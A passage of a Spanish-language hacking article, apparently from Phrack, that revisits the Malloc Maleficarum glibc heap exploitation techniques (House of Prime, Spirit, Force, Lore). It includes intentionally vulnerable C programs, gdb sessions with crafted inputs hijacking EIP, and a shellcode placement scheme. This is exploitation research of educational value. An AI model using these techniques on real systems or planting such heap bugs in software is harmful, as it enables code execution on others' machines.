+Lo cual no nos permite establecer un tamaño de trozo menor que "16".
+
+Haciendo honores a la primera casa desarrollada y construida por Phantasmal
+nosotros hemos demostrado que es posible llegar vivos a The House of Prime.
+
+
+
+                       << La tecnica no solo es una
+                          modificacion, es poder sobre
+                          las cosas. >>
+
+                                     [ Xavier Zubiri ]
+
+
+
+               -----------------------
+---[ 4.2.1 ---[   unsorted_chunks()   ]---
+               -----------------------
+
+Hasta la llamada a "malloc()", la tecnica es exactamente igual que la
+descrita en 4.2. La diferencia viene cuando la cantidad de bytes que se
+quieren reservar con dicha llamada, es superior a "av->max_fast", que 
+resulta ser el tamaño del segundo trozo liberado.
+
+Entonces, tal como nos adelanto Phantasmal, otro trozo de codigo puede ser
+desencadenado en vias de lograr sobreescribir una posicion arbitraria de
+memoria.
+
+Pero de nuevo estuvo errado al decir que:
+
+   "Firstly, the unsorted_chunks() macro returns av->bins[0]."
+
+Y esto no es cierto, puesto que "unsorted_chunks()" devolvera la direccion
+de av->bins[0] y no su valor, lo cual quiere decir que debemos idear otro
+metodo.
+
+Siendo estas lineas las mas relevantes:
+
+     .....
+        victim = unsorted_chunks(av)->bk
+        bck = victim->bk;
+        .....
+        .....
+        unsorted_chunks(av)->bk = bck;
+        bck->fd = unsorted_chunks(av);
+     .....
+
+Yo imagine el siguente metodo:
+
+ 1) Poner en &av->bins[0]+12 la direccion (&av->bins[0]+16-12). Entonces:
+
+    victim = &av->bins[0]+4;
+
+ 2) Poner en &av->bins[0]+16 la direccion de EIP-8. Entonces:
+
+    bck = (&av->bins[0]+4)->bk = av->bins[0]+16 = &EIP-8;
+
+ 3) Poner en av->bins[0] una instruccion "JMP 0xYY" para que salte al
+    menos mas lejos que &av->bins[0]+20. En la penultima instruccion
+    se destrozara &av->bins[0]+12, pero eso ya no importa, en la ultima
+    instruccion tendremos:
+
+    bck->fd = EIP = &av->bins[0];
+
+ 4) Poner (NOPS + SHELLCODE) a partir de &av->bins[0]+20.
+
+Cuando una instruccion "ret" sea ejecutada, se producira nuestro "JMP" y
+este caera directamente sobre los NOPS, desplazandose este hasta el
+shellcode.
+
+Deberiamos tener algo como esto:
+
+
+    &av->bins[0]   &av->bins[0]+12       &av->bins[0]+16
+    |              |                     |
+ ...[ JMP 0x16 ]...[ &av->bins[0]+16-12 ][ EIP - 8 ][ NOPS + SHELLCODE ]...
+           |______________________|______|__________|
+          (2)                     |______|
+                                 (1)
+
+  (1) Esto ocurre aqui: bck = (&av->bins[0]+4)->bk.
+  (2) Esto ocurre tras la ejecucion de un "ret".
+
+La enorme ventaja de este metodo es que logramos una ejecucion directa de
+codigo arbitrario en vez de retornar un trozo controlado de "malloc()".
+
+Tal vez atravesando este inteligente camino puedas llegar directamente a
+The House of Prime.
+
+*** NOTA: Yo aun estoy comprobando esta suposicion ***
+
+
+
+               << Felicidad no es hacer lo que
+                  uno quiere, sino querer lo que
+                  uno hace. >>
+
+                                [ J. P. Sartre ]
+
+
+
+             -------------------------
+---[ 4.3 ---[   THE HOUSE OF SPIRIT   ]---
+             -------------------------
+
+The House of Spirit es sin duda alguna una de las tecnicas mas sencillas
+de aplicar siempre que las circunstancias sean las propicias. El objetivo
+principal es sobreescribir un puntero que previamente ha sido reservado
+con una llamada a "malloc()" de modo que cuando este sea liberado, sea
+guardada en un "fastbin[]" una direccion arbitraria.
+
+Esto puede traer consigo que, en una futura llamada a malloc, este valor
+sea tomado como la nueva memoria para el trozo solicitado. Y que ocurre si
+hacemos que este trozo de memoria caiga en alguna zona especifica de la
+pila?
+
+Pues que si podemos controlar lo que escribimos en el, podemos alterar todo
+valor que se encuentre por delante. Como siempre, ahi es donde EIP entra en
+juego.
+
+Veamos un programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void fvuln(char *str1, int age)
+{
+   static char *ptr1, nombre[32];
+   int edad;
+   char *ptr2;
+
+   edad = age;
+
+   ptr1 = (char *) malloc(256);
+   printf("\nPTR1 = [ %p ]", ptr1);
+   strcpy(nombre, str1);
+   printf("\nPTR1 = [ %p ]\n", ptr1);
+
+   free(ptr1);
+
+   ptr2 = (char *) malloc(40);
+
+   snprintf(ptr2, 40-1, "%s tienes %d", nombre, edad);
+   printf("\n%s\n", ptr2);
+}
+
+int main(int argc, char *argv[])
+{
+   if (argc == 3)
+      fvuln(argv[1], atoi(argv[2]));
+
+   return 0;
+}
+
+[-----]
+
+Es facil ver como la funcion "strcpy()" nos permite sobreescribir el
+puntero "ptr1".
+
+   blackngel@mac:~$ ./hos `perl -e 'print "A"x32 . "BBBB"'` 20
+   PTR1 = [ 0x80c2688 ]
+   PTR1 = [ 0x42424242 ]
+   Fallo de segmentación
+
+Teniendo esto en cuenta, ya podemos modificar la direccion del trozo a
+nuestro antojo, pero no todas las direcciones son validas. Recuerda que
+para ejecutar el codigo "fastbin" descrito en The House of Prime,
+necesitamos que sea menor que "av->max_fast", y mas especificamente, segun
+Phantasmal, tiene que ser igual al tamaño solicitado en la futura llamada
+a "malloc()" + 8.
+
+Como uno de los parametros del programa es la "edad", podemos poner en la
+pila nuestro valor, que en este caso sera "48", y buscar su dirección.
+
+(gdb) x/4x $ebp-4
+0xbffff314:	0x00000030	0xbffff338	0x080482ed	0xbffff702
+
+En nuestro caso vemos que el valor esta justo detras de EBP, y tenemos que
+hacer que PTR1 apunte a EBP. Recuerda que estamos modificando el puntero a
+la memoria, no la dirección del trozo que esta 8 bytes mas atras.
+
+El requisito mas importante en esta tecnica, es que para superar el chequeo
+del siguiente trozo:
+
+      if (chunk_at_offset (p, size)->size <= 2 * SIZE_SZ
+          || __builtin_expect (chunksize (chunk_at_offset (p, size))
+                                          >= av->system_mem, 0))
+
+... en $EBP - 4 + 48 debemos tener un valor que cumpla las anteriores
+condiciones. En otro caso deberas buscar otras posiciones de memoria que
+te permitan controlar ambos valores.
+
+(gdb) x/4x $ebp-4+48
+0xbffff344:	0x0000012c	0xbffff568	0x080484eb	0x00000003
+
+Mostrare un esquema ahora de lo que sucede
+
+
+                   val1        objetivo                val2
+                    o             |                     o
+      -64           |  mem  -4    0   +4  +8  +12 +16   |
+       |            |   |    |    |    |   |   |   |    |
+  .....][P_SIZE][size+8][...][EBP][EIP][..][..][..][next_size][ ......
+                    |   |                           |
+                    o---|---------------------------o
+                        |      (size + 8) bytes
+                       PTR1
+                        |---> Futuro PTR2
+                                     ----
+
+   (objetivo) Valor a ser sobreescrito.
+   (mem)  Zona de datos del trozo falso.
+   (val1) Tamaño del trozo falso.
+   (val2) Tamaño del siguiente trozo.
+
+
+Si esto ocurre, el control estara en nuestras manos:
+
+[-----]
+
+blackngel@linux:~$ gdb -q ./hos
+(gdb) disass fvuln
+Dump of assembler code for function fvuln:
+0x080481f0 <fvuln+0>:	push   %ebp
+0x080481f1 <fvuln+1>:	mov    %esp,%ebp
+0x080481f3 <fvuln+3>:	sub    $0x28,%esp
+0x080481f6 <fvuln+6>:	mov    0xc(%ebp),%eax
+0x080481f9 <fvuln+9>:	mov    %eax,-0x4(%ebp)
+0x080481fc <fvuln+12>:	movl   $0x100,(%esp)
+0x08048203 <fvuln+19>:	call   0x804f440 <malloc>
+..........
+..........
+0x08048230 <fvuln+64>:	call   0x80507a0 <strcpy>
+..........
+..........
+0x08048252 <fvuln+98>:	call   0x804da50 <free>
+0x08048257 <fvuln+103>:	movl   $0x28,(%esp)
+0x0804825e <fvuln+110>:	call   0x804f440 <malloc>
+..........
+..........
+0x080482a3 <fvuln+179>:	leave  
+0x080482a4 <fvuln+180>:	ret    
+End of assembler dump.
+
+(gdb) break *fvuln+19          /* Antes de malloc() */
+Breakpoint 1 at 0x8048203
+
+(gdb) run `perl -e 'print "A"x32 . "\x18\xf3\xff\xbf"'` 48
+.........
+..........
+Breakpoint 1, 0x08048203 in fvuln ()
+(gdb) x/4x $ebp-4   /* 0x30 = 48 */
+0xbffff314:	0x00000030	0xbffff338	0x080482ed	0xbffff702
+
+(gdb) x/4x $ebp-4+48   /* 8 < 0x12c < av->system_mem */
+0xbffff344:	0x0000012c	0xbffff568	0x080484eb	0x00000003
+
+(gdb) c
+Continuing.
+
+PTR1 = [ 0x80c2688 ]
+PTR1 = [ 0xbffff318 ]
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+[-----]
+
+En este caso preciso, la direccion de EBP pasaria a ser la direccion de la
+zona de datos para PTR2, lo cual quiere decir, que a partir del cuarto
+caracter, EIP comenzara a ser sobreescrito, y ya puedes apuntar donde mas
+te plazca.
+
+Esta tecnica posee nuevamente la ventaja de seguir siendo aplicable en las
+versiones mas recientes de GLIBC. Debe ser tenido en cuenta que, la teoria
+de Phantasmal, se adelanto a su tiempo y todavia perdura intacta con el
+paso de los años.
+
+Ahora ya podemos sentir el poder de las brujas. Hemos llegado, volando en
+escoba, a The House of Spirit.
+
+
+
+                        << La television es el espejo donde
+                           se refleja la derrota de todo
+                           nuestro sistema cultural. >>
+
+                                       [ Federico Fellini ]
+
+
+
+             -------------------------
+---[ 4.4 ---[   THE HOUSE OF FORCE    ]---
+             -------------------------
+
+El trozo Wilderness, como ya mencione al principio de este articulo, puede
+parecer uno de los trozos mas temidos. Claro, es tratado de forma especial
+por las funciones "free()" y "malloc()", pero en este caso va a ser el
+desencadenante de una posible ejecucion de codigo arbitrario.
+
+El objetivo de esta tecnica radica en alcanzar la siguiente porcion de
+codigo en "_int_malloc()":
+
+[-----]
+
+    .....
+    use_top:
+      victim = av->top;
+      size = chunksize(victim);
+
+      if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) {
+        remainder_size = size - nb;
+        remainder = chunk_at_offset(victim, nb);
+        av->top = remainder;
+        set_head(victim, nb | PREV_INUSE |
+                 (av != &main_arena ? NON_MAIN_ARENA : 0));
+        set_head(remainder, remainder_size | PREV_INUSE);
+        check_malloced_chunk(av, victim, nb);
+        return chunk2mem(victim);
+      }
+    .....
+
+[-----]
+
+Para esta tecnica son necesarios 3 requisitos:
+
+   1 - Un overflow en un trozo que permita sobreescribir el Wilderness.
+   2 - Una llamada a "malloc()" con el tamaño definido por el usuario.
+   3 - Otra llamada a "malloc()" cuyos datos puedan ser manejados por el
+       usuario.
+
+El objetivo final es conseguir obtener un trozo posicionado en un lugar
+arbitrario de la memoria. Esta posicion sera la obtenida por la ultima
+llamada a "malloc()", pero antes deben tenerse en cuenta mas cosas.
+
+Veamos en primer lugar un posible programa vulnerable:
+
+[-----]
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+
+void fvuln(unsigned long len, char *str)
+{
+   char *ptr1, *ptr2, *ptr3;
+
+   ptr1 = malloc(256);
+   printf("\nPTR1 = [ %p ]\n", ptr1);
+   strcpy(ptr1, str);
+
+   printf("\nReservando: %u bytes", len);
+   ptr2 = malloc(len);
+   ptr3 = malloc(256);
+
+   strncpy(ptr3, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 256);
+}
+
+int main(int argc, char *argv[])
+{
+   char *pEnd;
+   if (argc == 3)
+      fvuln(strtoull(argv[1], &pEnd, 10), argv[2]);
+
+   return 0;
+}
+
+[-----]
+
+Segun Phantasmal, lo primero que debiamos hacer, era sobreescribir el trozo
+Wilderness logrando que su campo "size" fuera lo mas alto posible, asi como
+"0xffffffff". Ya que nuestro primer trozo ocupa 256 bytes, y es vulnerable
+a un overflow, 264 caracteres "\xff" lograran el objetivo.
+
+Con esto conseguimos que cualquier solicitud de memoria lo suficientemente
+grande, sea tratada con el codigo de "_int_malloc()" que acabamos de ver
+arriba sin necesidad de expandir el heap.
+
+El segundo objetivo se trata de alterar "av->top" de modo que apunte a una
+zona de memoria que este bajo nuestro control. Nosotros (se exlica en la
+siguiente seccion) trabajaremos con la pila, concretamente teniendo como
+objetivo a EIP. En realidad la direccion que debe ser colocada en "av->top"
+es &EIP - 8, porque estamos tratando con la direccion del trozo, y la zona
+de memoria que sera devuelta estara 8 bytes mas adelante, lugar en donde
+podremos escribir nuestros datos.
+
+Pero... Como alterar "av->top"?
+
+   victim = av->top;
+   remainder = chunk_at_offset(victim, nb);
+   av->top = remainder;
+
+"victim" coge el valor de la direccion del trozo wilderness actual, que en
+un caso normal, teniendo en cuenta donde esta PTR1, se veria asi:
+
+   PTR1 = [ 0x80c2688 ]
+
+   0x80bf550 <main_arena+48>:   0x080c2788
+
+y como podemos ver, "remainder" es exactamente la suma de esta direccion
+mas la cantidad de bytes solicitados por "malloc()", cantidad que debe
+ser controlada por el usuario como se ha dicho anteriormente.
+
+Entonces, si EIP se encuentra en "0xbffff22c", la direccion que deseamos
+colocar en remainder (que ira directa "av->top"), es en realidad esta:
+"0xbfffff24". Y ya que conocemos donde esta "av->top", nuestra cantidad
+de bytes a solicitar sera la siguiente:
+
+   0xbffff224 - 0x080c2788 = 3086207644
+
+Yo explote el programa con "3086207636", que nuevamente es debido a la
+diferencia entre la posicion del trozo y la zona de datos del trozo
+Wilderness.
+
+Desde ese momento, "av->top" contendra nuestro valor alterado, y cualquier
+solicitud que desencadene este trozo de codigo, obtendra esta direccion
+como su zona de datos. Todo lo que se escriba en el destrozara la pila.
+
+GLIBC 2.7 hace lo siguiente:
+
+      ....
+      void *p = chunk2mem(victim);
+      if (__builtin_expect (perturb_byte, 0))
+	alloc_perturb (p, bytes);
+      return p;
+
+Veamoslo en accion:
+
+[-----]
+
+blackngel@linux:~$ gdb -q ./hof
+(gdb) disass fvuln
+Dump of assembler code for function fvuln:
+0x080481f0 <fvuln+0>:   push   %ebp
+0x080481f1 <fvuln+1>:   mov    %esp,%ebp
+0x080481f3 <fvuln+3>:   sub    $0x28,%esp
+0x080481f6 <fvuln+6>:   movl   $0x100,(%esp)
+0x080481fd <fvuln+13>:  call   0x804d3b0 <malloc>
+..........
+..........
+0x08048225 <fvuln+53>:  call   0x804e710 <strcpy>
+..........
+..........
+0x08048243 <fvuln+83>:  call   0x804d3b0 <malloc>
+0x08048248 <fvuln+88>:  mov    %eax,-0x8(%ebp)
+0x0804824b <fvuln+91>:  movl   $0x100,(%esp)
+0x08048252 <fvuln+98>:  call   0x804d3b0 <malloc>
+..........
+..........
+0x08048270 <fvuln+128>: call   0x804e7f0 <strncpy>
+0x08048275 <fvuln+133>: leave  
+0x08048276 <fvuln+134>: ret    
+End of assembler dump.
+
+(gdb) break *fvuln+83      /* Antes de malloc(len) */
+Breakpoint 1 at 0x8048243
+
+(gdb) break *fvuln+88      /* Despues de malloc(len) */
+Breakpoint 2 at 0x8048248
+
+(gdb) run 3086207636 `perl -e 'print "\xff"x264'`
+.....
+PTR1 = [ 0x80c2688 ]
+
+Breakpoint 1, 0x08048243 in fvuln ()
+Current language:  auto; currently asm
+(gdb) x/16x &main_arena
+..........
+..........
+0x80bf550 <main_arena+48>:  0x080c2788  0x00000000  0x080bf550  0x080bf550
+                                 | 
+(gdb) c                       av->top
+Continuing.
+
+Breakpoint 2, 0x08048248 in fvuln ()
+(gdb) x/16x &main_arena
+..........
+..........
+0x80bf550 <main_arena+48>:  0xbffff220  0x00000000  0x080bf550  0x080bf550
+                                 |
+                          apunta al stack
+(gdb) x/4x $ebp-8
+0xbffff220:   0x00000000   0x480c3561   0xbffff258   0x080482cd
+                                | 
+(gdb) c                    importante
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()    /* El propio programa destroza la pila */
+(gdb) 
+
+[-----]
+
+Aja! Asi que era posible...
+
+He señalado un valor como "importante" en el stack, y es que una de las
+ultimas condiciones para una ejecucion exitosa de esta tecnica, requiere
+que el campo "size" del nuevo trozo Wilderness falseado, sea al menos mas
+grande que la solicitud realizada por la ultima llamada a "malloc()".
+
+NOTA: Como habras visto en la introduccion de este articulo, g463 escribio
+      un articulo acerca de como tomar ventaja de la macro set_head() con
+      el objetivo de sobreescribir una direccion de memoria arbitraria.
+      Seria altamente recomendable que leyeras este trabajo. El tambien
+      presento una breve investigacion sobre The House of Force.
+
+      Debido a un grave error mio, yo no lei este articulo hasta que un
+      miembro de Phrack me advirtio de su existencia poteriormente a la
+      edicion de mi articulo. Yo continuo sorprendiendome cada dia con
+      lo habilidosos que los hackers se estan volviendo. El trabajo de
+      g463 es algo realmente inteligente.
+
+Para terminar esta tecnica, yo me pregunte que sucederia si, en vez de lo que
+acabamos de ver, el codigo vulnerable tuviera el siguiente aspecto:
+
+   .....
+   char buffer[64];
+
+   ptr2 = malloc(len);
+   ptr3 = calloc(256);
+
+   strncpy(buffer, argv[1], 63);
+   .....
+
+En principio es bastante similar, solo que el ultimo trozo de memoria reservado
+se hace a traves de la funcion "calloc()" y en este caso no controlamos su
+contenido, sino el de un buffer declarado al principio de la funcion vulnerable.
+
+Ante este obstaculo, yo tuve una primera idea en mente. Si sigue siendo posible
+devolver un trozo de memoria arbitrario y ya que calloc() lo rellenara con "0's"
+, tal vez podriamos situarlo de tal forma que ese ultimo byte NULL "0" pueda
+sobreescribir el ultimo byte de un EBP guardado, de modo que este sea pasado
+finalmente a ESP, y pudieramos controlar definitivamente la direccion de retorno
+desde dentro de nuestro buffer[].
+
+Pero pronto adverti que el alineamiento de memoria que produce malloc() cuando
+este es llamado, frustra esta posibilidad. Como mucho, sobrescribiriamos EBP
+por completo con "0's", lo cual no sirve de nada para nuestros fines. Y ademas,
+siempre habia que tener cuidado de no machacar con ceros nuestro buffer[] si la
+reserva de memoria se produce despues de que su contenido haya sido establecido
+por el usuario.
+
+Y eso es todo... Como siempre, esta tecnica tambien continua siendo aplicable
+hasta el dia de hoy con las versiones mas recientes de GLIBC.
+
+Hemos llegado, empujados con el poder de la fuerza, a The House of Force.
+
+
+
+                          << La gente comienza a plantearse
+                             si todo lo que se puede hacer
+                             se debe hacer. >>
+
+                                          [ D. Ruiz Larrea ]
+
+
+
+               --------------
+---[ 4.4.1 ---[   ERRORES    ]---
+               --------------
+
+En realidad lo que acabamos de realizar en la seccion anterior, el hecho
+de utilizar el stack, fue la unica solucion viable que yo encontre tras
+darme cuenta de algunos errores que Phantasmal no habia presupuesto.
+
+La cuestion es que en la descripcion de su tecnica, el planteaba la
+posibilidad de sobreescribir objetivos como .dtors o la mismisima GOT,
+pero yo pronto me di cuenta de que esto no parecia ser posible.
+
+Teniendo en cuenta que "av->top" resultaba ser: [ 0x080c2788 ]. Un pequeño
+analisis como este...
+
+     blackngel@linux:~$ objdump -s -j .dtors ./hof
+     .....
+     Contents of section .dtors:
+     80be47c ffffffff 20480908 00000000
+     .....
+     Contents of section .got:
+     80be4b8 00000000 00000000 
+
+... nos permite ver que ambas direcciones se encuentran por detras de
+la direccion de "av->top", y una suma no nos conduce a estas direcciones.
+Punteros de funcion, la region BSS, y otras cosas tambien estaran por
+detras...
+
+El que quiera jugar con numeros negativos o con desbordamientos de entero
+le permito que haga las pruebas que crea necesarias.
+
+Es por todo esto que en el Malloc Maleficarum NO se menciono que el valor
+controlado por el usuario para la primera reserva de memoria, debia ser un
+"unsigned" o, de otro modo, cualquier valor mayor que 2147483647 cambiaria
+de signo directamente, pasando a ser un valor negativo, lo que acaba en la
+mayoria de los casos con un fallo de segmentacion.
+
+El no tuvo esto en cuenta ya que daba por hecho que podia sobrescribir
+posiciones de memoria que estaban en direcciones mas altas que el trozo
+Wilderness, pero no tan lejos como "0xbffffxxx".
+
+En este mundo nada es imposible, y yo se que tu puedes sentir The House of
+Force.
+
+
+
+               << La utopia esta en el horizonte. Me
+                  acerco dos pasos, ella se aleja dos
+                  pasos. Camino diez pasos y el horizonte
+                  se corre diez pasos mas alla. Por
+                  mucho que yo camine, nunca la alcanzare.
+                  Para que sirve la utopia? Para eso
+                  sirve, para caminar. >>
+
+                                            [ E. Galeano ]
+
+
+
+             -----------------------
+---[ 4.5 ---[   THE HOUSE OF LORE   ]---
+             -----------------------
+
+Esta tecnica no sera detallada aqui, por resultar, al menos para mi, lo
+mas artificial que se puede encontrar en el Malloc Maleficarum.
+
+El principal motivo es que requiere el desencadenamiento de numerosas
+llamadas a "malloc()", lo cual deja de ser un valor manipulable por el
+exploiter y convierte la tecnica en algo irreal.
+
+El motivo es el siguiente, cuando un trozo se almacena en su "bin"
+correspondiente, se inserta como el primero de ellos:
+
+      1) Se calcula el indice para el tamaño del trozo:
+            victim_index = smallbin_index(size);
+      2) Se obtiene el bin adecuado:
+            bck = bin_at(av, victim_index);
+      3) Se obtiene el primer trozo actual:
+            fwd = bck->fd;
+      4) El puntero "bk" del trozo a insertar apunta al bin:
+            victim->bk = bck;
+      5) El puntero "fd" del trozo a insertar apunta al que
+         antes era el primer trozo en el "bin":
+            victim->fd = fwd;
+      6) El puntero "bk" de ese siguente trozo apunta ahora
+         a nuestro trozo insertado:
+            fwd->bk = victim;
+      7) EL puntero "fd" del "bin" apunta a nuestro trozo:
+            bck->fd = victim;
+
+
+                   bin->bk  ___  bin->fwd
+                  o--------[bin]----------o
+                  !         ^ ^           !
+               [last]-------| |-------[victim]
+                 ^|   l->fwd    v->bk    ^|
+                 |!                      |!
+               [....]                  [....]
+                   \\                  //
+                    [....]        [....]
+                     ^ |____________^ |
+                     |________________|
+
+
+Y como dentro de "unlink code", "victim" es tomado de "bin->bk", deberian
+sucederse varias llamadas a "malloc()" de modo que nuestro trozo deseado se
+vaya desplazando hasta ocupar la posicion "last". 
+
+Vamos a ver el codigo para descubrir un par de cosas:
+
+      .....
+      if ( (victim = last(bin)) != bin) {
+        if (victim == 0) /* initialization check */
+          malloc_consolidate(av);
+        else {
+          bck = victim->bk;
+          set_inuse_bit_at_offset(victim, nb);
+          bin->bk = bck;
+          bck->fd = bin;
+          ...
+          return chunk2mem(victim);
+      .....
+
+En esta tecnica, Phantasmal decia que el objetivo final era sobreescribir
+"bin->bk", pero el primer elemento que podemos controlar, es "victim->bk".
+Hasta donde yo alcanzo a ver, para lograr esto debemos conseguir que el
+trozo overfloweado pasado a "free()", se situe en la posicion anterior al
+trozo "last", de modo que "victim->bk" apunte a su direccion, que debemos
+controlar y deberia apuntar a la pila.
+
+Esta direccion pasara a "bck" y seguidamente modificara "bin->bk". Con ello
+conseguimos que ahora nuestra direccion controlada sea el trozo "last" en
+si mismo.
+
+Es por este motivo que es necesaria una nueva llamada a "malloc()" con el
+mismo tamaño que la anterior solicitud, de modo que este valor sea el nuevo 
+"victim" y sea devuelto en: return chunk2mem(victim);
+
+
+     *ptr1 -> modified;
+
+     Primera llamada "malloc()":
+     ---------------------------
+
+         ___[chunk]_____[chunk]_____[chunk]____ 
+        |                                      |
+        !    bk                 bk             |
+      [bin]----->[last=victim]----->[ ptr1 ]---/
+        ^____________| ^_______________|
+             fwd      ^       fwd
+                      |
+        return chunk2men(victim);
+
+
+     Segunda llamada "malloc()":
+     ---------------------------
+
+         ___[chunk]_____[chunk]_____[chunk]____ 
+        |                                      |
+        !    bk              bk                |
+      [bin]----->[ ptr1 ]--------->[ chunk ]---/
+        ^___________| ^________________|
+             fwd     ^       fwd
+                     |
+        return chunk2men(ptr1);
+
+
+Uno debe tener cuidado tambien con que sobreescribe "bck->fd" en su turno,
+aunque en el stack esto no suele ser mayor problema. Ah, es una pena no
+controlar el "bin" en si mismo, en otro caso esta instruccion constituiria
+una maravilla.
+
+Es por todo esto que, si tu interes es realmente el suficiente, mi consejo
+seria no prestar mucha antecion a The House of Prime, tal como indico
+Phantasmal en su paper, sino que, en su lugar, estudiaria nuevamente The
+House of Spirit.
+
+En teoria, aplicando una tecnica parecida, un trozo falso deberia poder ser
+situado en su correspondiente "bin" y conseguir que una futura llamada a
+"malloc()" retorne el mismo espacio de memoria.
+
+Recuerda que para que el codigo "small bin" sea ejecutado en lugar de
+"fastbin", el tamaño del trozo liberado y solicitado posteriormente, debe
+ser mayor a "av->max_fast" (72) y menor que 512:
+
+   #define NSMALLBINS        64
+   #define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
+   #define MIN_LARGE_SIZE    (NSMALLBINS * SMALLBIN_WIDTH)
+
+   [64] * [8] = [512]
+
+Para el metodo "largebin", habra que servirse de trozos mayores que este
+tamaño calculado.
+
+Como en todas las casas, es solo cuestion de jugar, y The House of Lore,
+aunque no es muy apta para un caso verosimil, tampoco se puede decir que
+sea una completa excepcion...
+
+
+
+                   << La humanidad necesita con urgencia
+                      una nueva sabiduria que proporcione
+                      el conocimiento de como usar el
+                      conocimiento para la supervivencia
+                      del hombre y para la mejora de la
+                      calidad de vida. >>
+
+                                         [ V. R. Potter ]
+
+
+
+             ------------------------------
+---[ 4.6 ---[   THE HOUSE OF UNDERGROUND   ]---
+             ------------------------------
+
+Bien, realmente esta casa no fue descrita por Phantasmal Phantasmagoria en
+su paper, pero a mi me resulta bastante util para describir un concepto que
+tengo en mente.
+
+En este mundo todo son posibilidades. Posibilidades de que algo salga bien,
+o posibilidades de que algo salga mal. En el mundo de la explotacion de
+vulnerabilidades esto sigue siendo igual de cierto. El problema radica como
+siempre en la capacidad para encontrar estas posibilidades, normalmente las
+posibilidades de que ese algo salga bien.
+
+Hablar en estos momentos de unir varias de las tecnicas anteriores en un
+mismo ataque no deberia resultar tan extraño, y a veces podria ser la
+solucion mas adecuada. Recordemos que g463 no se conformo con la tecnica
+The House of Force para trabajar sobre la vulnerabilidad de la aplicacion
+file(1), sino que, no siendo esta aplicable, busco nuevas posibilidades
+para que las cosas salieran bien, y de ahi que el mundo de la explotacion
+sea un continuo avance.
+
+Por ejemplo... que hay acerca de utilizar en un mismo instante las tecnicas
+The House of Mind y The House of Spirit?
+
+Piensese que ambas tienen sus propias limitaciones. Por un lado, The House
+of Mind necesita como ya se ha dicho un trozo de memoria reservado en una
+dirección por encima de "0x08100000", mientras que The House of Spirit, por
+su parte, precisa que, una vez que el puntero a ser liberado haya sido
+sobreescrito, una nueva llamada a malloc() sea realizada.
+
+En The House of Mind, el objetivo principal es controlar la estructura
+"arena", y para ello se empieza por modificar el tercer bit menos
+significativo del campo tamaño del trozo sobreescrito (P). Pero el hecho
+de poder modificar estos metadatos, no quiere decir que tengamos control
+sobre la direccion del trozo (P).
+
+En cambio, en The House of Spirit, nosotros modificamos la direccion del
+trozo P por medio de la manipulacion del puntero a la zona de datos (*mem).
+Pero que ocurre si en tu programa vulnerable no existe una nueva llamada
+a malloc() que te devuelva un trozo de memoria arbitraria en el stack?
+
+Todavia se pueden investigar nuevos caminos, aunque yo no aseguro que vayan
+a funcionar.
+
+Si nosotros podemos alterar un puntero a ser liberado, como en The House
+of Spirit, este sera pasado a free() en:
+
+   public_fREe(Void_t* mem)
+
+Nosotros podemos hacer que apunte a algun sitio como el stack o el entorno.
+Siempre debe ser una posicion de memoria con datos controlados por el
+usuario. Entonces la direccion efectiva del trozo se tomara en:
+
+   p = mem2chunk(mem);
+
+Hasta este punto abandonamos The House of Spirit para centrarnos en The
+House of Mind. Entonces debemos nuevamente controlar la arena "ar_ptr",
+y para conseguirlo, (&p + 4) deberia contener un tamaño con el bit
+NON_MAIN_ARENA activado.
+
+Pero eso no es lo mas importante aqui, la pregunta final es: serias capaz
+de situar el trozo en un lugar tal que luego puedas controlar la zona de
+memoria devuelta por "heap_for_ptr(ptr)->ar_ptr"?
+
+Recuerda que en el stack eso seria algo como "0xbff00000". Parece bastante
+complicado desde luego, ya que introducir un relleno en el entorno no
+permite alcanzar una direccion tan baja.
+
+Pero vuelvo a repetir, todos los caminos deben ser estudiados, puede que tu
+descubras un nuevo metodo, y quizas lo llames The House of Underground...
+
+
+
+                 << Los apasionados de Internet han encontrado
+                    en esta opcion una impensada oportunidad
+                    de volver a ilusionarse con el futuro. No
+                    solo algunos disfrutan como enanos; creen
+                    que este instrumento agiganta y que, acabada
+                    la fragmentacion entre unos y otros, se ha
+                    ingresado en la era de la conexion global.
+                    Internet no tiene centro, es una red de
+                    dibujo democratico y popular. >>
+
+                               [ V. Verdu: El enredo de la red ]
+
+
+
+           -------------------------------------
+---[ 5 ---[   ASLR y Nonexec Heap (El Futuro)   ]---
+           -------------------------------------
+
+Nosotros no hemos discutido a lo largo de este articulo acerca de sortear
+protecciones como la aleatorizacion de direcciones de memoria (ASLR) y la
+presencia de un heap no ejecutable. Y no lo haremos, pero algo podemos
+decir al respecto. Tu deberias ser consciente de que yo he harcodeado la
+mayoria de las direcciones en cada uno de mis principalmente basicos
+exploits. Desafortunadamente, esta forma de trabajo no es muy fiable en los
+dias en que vivimos.
+
+En todas las tecnicas presentadas en este articulo, especialmente en The
+House of Spirit y The House of Force, donde finalmente todo se transforma
+en un clasico stack overflow, nosotros suponemos que podrian ser aplicables
+los metodos descritos en otros articulos publicados en Phrack u otras
+publicaciones externas que explican como evadir la proteccion ASLR y otros
+como return-into-mprotect() que hablan acera de sortear un heap no
+ejecutable y cosas por el estilo.
+
+Con respecto al primer tema, nosotros tenemos un trabajo genial, "Bypassing
+PaX ASLR protection" [11] por Tyler Durden en Phrack 59.
+
+Por otro lado, sortear un heap no ejecutable depende a su vez de si ASLR
+se encuentra presente y, sobretodo, de nuestras habilidades para encontrar
+la direccion real de una funcion como mprotect( ) que nos permita cambiar
+los permisos de las paginas de memoria.
+
+Desde que yo empece mi pequeña investigacion y el trabajo de escribir este
+articulo, mi objetivo ha sido siempre dejar esta tarea como deberes para
+los nuevos hackers quienes tengan la fuerza suficiente como para continuar
+en este camino.
+
+En resumen, esta es una nueva area para una investigacion futura.
+
+
+
+                 << Todo tiene algo de belleza, pero
+                    no todos son capaces de verlo. >>
+
+                                         [ Confucio ]
+
+
+
+           -------------------------
+---[ 6 ---[   THE HOUSE OF PHRACK   ]---
+           -------------------------
+
+
+Esto es solo un camino para que puedas seguir investigando. Tenemos ante
+nosotros un mundo lleno de posibilidades, y la mayoria de ellas todavia
